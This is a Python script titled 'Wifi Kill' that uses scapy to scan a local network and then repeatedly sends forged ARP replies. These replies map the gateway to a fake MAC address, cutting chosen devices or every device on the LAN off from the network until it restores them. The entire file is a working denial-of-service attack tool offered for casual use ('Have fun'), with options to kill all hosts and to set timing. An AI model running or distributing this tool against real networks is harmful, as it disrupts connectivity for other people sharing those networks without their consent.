#!/usr/bin/env python3

###############################################################################
#         Wifi Kill                                                           #
#        Robert Glew                                                          #
#                                                                             #
# This python script can be used to kick anyone or everyone off of your wifi  #
# network. The script must be run as sudo in order to send the required       #
# packets. Have fun.                                                          #
###############################################################################

import time
import os
import getopt
import sys
from builtins import input
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_ip_macs(ips):
    # Returns a list of tupples containing the (ip, mac address)
    # of all of the computers on the network

    answers, uans = arping(ips, verbose=0)
    res = []
    for answer in answers:
        mac = answer[1].hwsrc
        ip = answer[1].psrc
        res.append((ip, mac))
    return res


def poison(victim_ip, victim_mac, gateway_ip, details=False):
    # Send the victim an ARP packet pairing the gateway ip with the wrong
    # mac address
    packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC',
                 pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
    if details:
        print('poisoned\t{}\t{}'.format(victim_ip, victim_mac))


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, details=False):
    # Send the victim an ARP packet pairing the gateway ip with the correct
    # mac address
    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
                 pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
    if details:
        print('restored\t{}\t{}'.format(victim_ip, victim_mac))


def get_lan_ip():
    # A hacky method to get the current lan ip address. It requires internet
    # access, but it works
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()
    s.close()
    return ip[0]


def printdiv():
    print('--------------------')


import argparse
parser = argparse.ArgumentParser(
    description='A python program that uses scapy to kick people off of wifi')

group = parser.add_mutually_exclusive_group()
group.add_argument('-k', help="kill the address",
                   metavar='ip|mac', nargs='+')
group.add_argument('-r', help='restore the address',
                   metavar='ip|mac', nargs='+')
group.add_argument(
    '-ka', help='kill all addresses in the LAN', action='store_true')
group.add_argument(
    '-ra', help='restore all addresses', action='store_true')
parser.add_argument('-t', help='timing of kill', metavar='second')
parser.add_argument('-ig', help='ignore the address',
                    metavar='ip|mac', nargs='+')
parser.add_argument('--details', help='show kill details', action='store_true')
parser.add_argument('--lan', help='manually specify the lan ip', metavar='ip')
args = parser.parse_args()

# Check for root
if os.geteuid() != 0:
    print('You need to run the script as a superuser')
    exit()

# Search for stuff every time we refresh
refreshing = True
gateway_mac = '12:34:56:78:9A:BC'  # A default (bad) gateway mac address
ignores = []

while refreshing:
    refreshing = False
    # Use the current ip XXX.XXX.XXX.XXX and get a string in
    # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
    # the script assumes that the default gateway is "XXX.XXX.XXX.1"
    myip = get_lan_ip()
    if args.lan:
        myip = args.lan
    ip_list = myip.split('.')
    del ip_list[-1]
    ip_list.append('*')
    ip_range = '.'.join(ip_list)
    del ip_list[-1]
    ip_list.append('1')
    gateway_ip = '.'.join(ip_list)

    # Get a list of devices and print them to the screen
    devices = get_ip_macs(ip_range)
    printdiv()
    print('Connected ips:')
    i = 0
    for device in devices:
        print('{})\t{}\t{}'.format(i, device[0], device[1]))
        # See if we have the gateway MAC
        if device[0] == gateway_ip:
            gateway_mac = device[1]
        i += 1

    printdiv()
    print('Gateway ip:  {}'.format(gateway_ip))
    if gateway_mac != '12:34:56:78:9A:BC':
        print('Gateway mac: {}'.format(gateway_mac))
    else:
        print(
            'Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over')
    printdiv()

    if args.ig:
        ignores = args.ig
        print('Ignore list: {}'.format(ignores))
        printdiv()

    # Get a choice and keep prompting until we get a valid letter or a number
    # that is in range
    kill = True
    kill_list = []

    def get_victim(address):
        for device in devices:
            if address == device[0] or address == devices[1]:
                return device
        print('No device like {}'.format(address))
        return None

    if args.ka:
        kill_list = devices
    elif args.ra:
        kill = False
        kill_list = devices
    elif args.k:
        for address in args.k:
            victim = get_victim(address)
            if victim:
                kill_list.append(victim)
    elif args.r:
        kill = False
        for address in args.r:
            victim = get_victim(address)
            if victim:
                kill_list.append(victim)
    else:
        print('Who do you want to boot?')
        print('(r - Refresh, a - Kill all, ra - Restore all, q - quit)')

        while True:
            choice = input(">")
            assert isinstance(choice, str)

            def kill_append(num):
                # If we have a number, see if it's in the range of choices
                if num < len(devices) and num >= 0:
                    victim = devices[num]
                    kill_list.append(victim)

            if choice.isdigit():
                kill_append(int(choice))
                break
            elif choice.find(' ') != -1:
                for num in [int(n) for n in choice.split()]:
                    kill_append(num)
                break
            elif choice is 'a':
                # If we have an a, set the flag to kill everything
                kill_list = devices
                break
            elif choice is 'r':
                # If we have an r, say we have a valid input but let everything
                # refresh again
                refreshing = True
                break
            elif choice == 'ra':
                kill = False
                kill_list = devices
                break
            elif choice is 'q':
                # If we have a q, just quit. No cleanup required
                exit()

            print('Please enter a valid choice')

if len(kill_list) == 0:
    print('No device to be killed, exit program')
    exit()


def restoreAll():
    print('Restoring')
    for victim in kill_list:
        if victim[0] in ignores or victim[1] in ignores:
            if args.details:
                print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
            continue
        restore(victim[0], victim[1], gateway_ip,
                gateway_mac, details=args.details)
    print('\nYou\'re welcome!')
    exit(0)


if kill:
    # If we have a number, loop the poison function until we get a
    # keyboard inturrupt (ctrl-c)
    try:
        print('Killing')
        start = time.time()
        while True:
            if(args.t and time.time() - start > int(args.t)):
                print("Time out")
                restoreAll()
            for victim in kill_list:
                if victim[0] in ignores or victim[1] in ignores:
                    if args.details:
                        print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
                    continue
                poison(victim[0], victim[1], gateway_ip, details=args.details)
    except KeyboardInterrupt:
        restoreAll()
else:
    restoreAll()
